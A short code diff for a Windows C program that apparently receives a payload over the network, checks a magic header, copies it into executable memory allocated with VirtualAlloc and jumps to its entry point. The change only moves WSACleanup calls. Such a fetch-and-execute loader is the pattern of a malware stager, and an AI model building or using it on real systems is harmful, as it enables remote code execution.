@@ -94,15 +94,14 @@ int main(int argc, char** argv) {
 		WSACleanup();
 		exit(EXIT_FAILURE);
 	}
+        WSACleanup();
 	printf("read %llu bytes of payload\n", len);
 	if (image_size < 24) {
 		fprintf(stderr, "invalid image\n");
-		WSACleanup();
 		exit(EXIT_FAILURE);
 	}
 	if (strncmp("BEADFACE", image_buffer, 8) != 0) {
 		fprintf(stderr, "invalid magic\n");
-		WSACleanup();
 		exit(EXIT_FAILURE);
 	}
 	entry = *(((uint64_t*)image_buffer) + 1);
@@ -116,7 +115,6 @@ int main(int argc, char** argv) {
             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (mem_ptr == NULL) {
 		fprintf(stderr, "VirtualAlloc() failed: %d\n", GetLastError());
-		WSACleanup();
 		exit(EXIT_FAILURE);
 	}
 	printf("got %p\n", mem_ptr);
@@ -126,7 +124,7 @@ int main(int argc, char** argv) {
 	}
 	entry += base;
 	memcpy(mem_ptr, image_buffer + 24, image_size - 24);
-	
+
 	printf("jumping to %d\n", entry);
 	((void (*)(void))entry)();
 	return 0;
